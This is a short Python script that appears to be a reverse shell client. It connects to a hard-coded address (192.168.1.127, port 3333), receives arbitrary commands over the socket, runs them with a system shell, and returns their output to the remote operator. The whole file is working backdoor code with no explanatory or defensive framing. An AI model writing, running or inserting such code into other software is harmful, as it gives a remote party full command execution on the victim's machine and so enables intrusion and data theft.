import socket
import subprocess
SERVER_IP = '192.168.1.127'
SERVER_PORT = 3333
#s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    while True:
        command = s.recv(1024).decode('utf-8')
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        #print(command)
        #print(stdout.decode('utf-8'))
        if(stdout.decode('utf-8')):
            s.send(stdout)
        elif(stderr.decode('utf-8')):
            s.send(stderr)
        else:
            s.send(b' ')

